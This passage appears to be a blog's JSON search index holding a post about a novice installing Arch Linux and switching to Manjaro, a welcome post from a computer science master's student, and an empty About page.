comfortable features that DEs provide to users. I messed up a few times and ended up reinstalling Arch over and over. Later, I found out about Manjaro Linux which is an Arch-based distro that carries the benefits of Arch with more user-friendly features! Manjaro definitely takes care of some of the chores that I have to go through when installing Arch (of course, I am a noob Linux user).\nSome of the lessons I learned from installing Arch-based distros:\nHibernation does not work out of the box (at least for my Thinkpad). You don\u0026rsquo;t have to have a desktop environment! Window managers are cool except I ended up spending too much time trying them and configuring them\u0026hellip; There are many configurations that you have to take care of in order for you to have your machine work as your flavor! Next time, I will talk about my struggle with I3 window manager and my migration to Sway window manager.\n","permalink":"https://joonkim0625.github.io/posts/2021-08-11-installing-linux/","summary":"\u003cp\u003eI was crazy enough to choose Arch Linux as my first Linux distro to start with -\nwhen a lot of people recommend choosing user-friendly distros to begin with.\nFrom creating a bootable USB to deciding what kind of programs to install so I\ncan have my laptop work, it took a very long time.\u003c/p\u003e\n\u003cp\u003eThen, somehow, I got into this thinking that I didn\u0026rsquo;t want to have a desktop\nenvironment (DE) installed but wanted to install a window manager only! This, of\ncourse, was me refusing all the comfortable features that DEs provide to users.\nI messed up a few times and ended up reinstalling Arch over and over. Later, I\nfound out about Manjaro Linux which is an Arch-based distro that carries the\nbenefits of Arch with more user-friendly features! Manjaro definitely takes care\nof some of the chores that I have to go through when installing Arch (of course,\nI am a noob Linux user).\u003c/p\u003e","title":"My Choice of Linux Distro"},{"content":"Hello! Hi, this is Joon and I will be writing about some of the things that I do while studying at the University of Minnesota - Twin Cities. I will be starting my first year of Master\u0026rsquo;s program in computer science.\nI hope you enjoy your time here!\nThanks for visiting,\nJoon\n","permalink":"https://joonkim0625.github.io/posts/2021-08-05-first-post/","summary":"\u003ch1 id=\"hello\"\u003eHello!\u003c/h1\u003e\n\u003cp\u003eHi, this is Joon and I will be writing about some of the things that I do while\nstudying at the University of Minnesota - Twin Cities. I will be starting my\nfirst year of Master\u0026rsquo;s program in computer science.\u003c/p\u003e\n\u003cp\u003eI hope you enjoy your time here!\u003c/p\u003e\n\u003cp\u003eThanks for visiting,\u003c/p\u003e\n\u003cp\u003eJoon\u003c/p\u003e","title":"Welcome!"},{"content":"Work in progress\u0026hellip;\n","permalink":"https://joonkim0625.github.io/about/","summary":"\u003cp\u003eWork in progress\u0026hellip;\u003c/p\u003e","title":""}]